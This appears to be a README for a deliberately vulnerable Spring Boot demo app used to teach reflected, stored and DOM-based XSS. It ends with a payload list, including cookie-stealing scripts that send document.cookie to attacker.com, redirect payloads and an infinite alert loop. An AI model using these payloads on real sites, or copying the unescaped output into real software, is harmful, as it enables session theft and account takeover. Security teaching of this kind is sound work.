# XSS SpringBoot Demo

This project is a demonstration of Cross-Site Scripting (XSS) vulnerabilities in a Spring Boot application. It is designed for educational purposes to understand how XSS attacks work and how to prevent them.

**WARNING: This application contains intentional security vulnerabilities. Do not deploy this in a production environment.**

## Technologies Used

- **Java**: 21
- **Framework**: Spring Boot 3.4.4
- **Template Engine**: Thymeleaf
- **Database**: SQL Server (MSSQL)
- **ORM**: Spring Data JPA
- **Build Tool**: Maven

## Prerequisites

Before running the application, ensure you have the following installed:

- Java Development Kit (JDK) 21
- Maven
- SQL Server (MSSQL)

## Installation & Running

1.  **Clone the repository:**
    ```bash
    git clone <repository-url>
    cd <repository-directory>
    ```

2.  **Configure the database:**
    Open `src/main/resources/application.properties` and update the database connection details if necessary:
    ```properties
    spring.datasource.url=jdbc:sqlserver://localhost:1433;databaseName=XSSDemo;encrypt=false
    spring.datasource.username=sa
    spring.datasource.password=1234
    ```
    *Note: Ensure the database `XSSDemo` exists or let Hibernate create it (ddl-auto is set to `update`).*

3.  **Run the application:**
    ```bash
    mvn spring-boot:run
    ```

4.  **Access the application:**
    Open your browser and navigate to `http://localhost:8080`.

## XSS Demonstration

This application demonstrates three types of XSS vulnerabilities:

### 1. Reflected XSS
- **Endpoint**: `/search`
- **Parameter**: `q`
- **Description**: The application reflects the user input from the `q` parameter directly into the response without sanitization.
- **Test**:
    ```
    http://localhost:8080/search?q=<script>alert('Reflected XSS')</script>
    ```

### 2. Stored XSS
- **Endpoint**: `/comments`
- **Description**: Comments posted by users are stored in the database and displayed to other users without escaping HTML.
- **Test**:
    1. Go to `/comments`.
    2. Enter `<script>alert('Stored XSS')</script>` in the comment box.
    3. Submit the comment.
    4. The alert will pop up every time the page is loaded.

### 3. DOM-based XSS
- **Endpoint**: `/dom-xss`
- **Description**: The application uses JavaScript to process user input in an unsafe way, leading to code execution in the browser.
- **Test**:
    ```
    http://localhost:8080/dom-xss?name=<img src=x onerror=alert(1)>
    ```

## Payloads Reference

Here is a list of payloads that can be used to test the vulnerabilities in this application:

### Basic Payloads
- `<script>alert('Hacked!')</script>`
- `<script>document.body.innerHTML='<h1>Hacked by XSS</h1>';</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<a href="javascript:alert(1)">Click me</a>`

### Cookie Stealing
- `<script>new Image().src="http://attacker.com/log.php?c="+document.cookie;</script>`
- `<script>window.location.href = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);</script>`
- `<script>fetch("http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie), { method: "GET", mode: "no-cors" });</script>`

### Redirection
- `<script>window.location.href = "http://attacker.com/malicious-page";</script>`
- `<script>while(true) { alert('Trang web bị hack!'); }</script>`

### SQL Injection (Contextual)
- `DELETE FROM comment WHERE content LIKE '%Hacked by XSS%';`
- `DELETE FROM comment WHERE content LIKE '%<script>%';`

### Other Vectors
- `<input onfocus=alert(1) autofocus>`
- `<iframe src="javascript:document.write('<script>alert(1)</script>');">`
- `"><script>alert(1)</script>`
- `"><svg onload=alert(1)>`
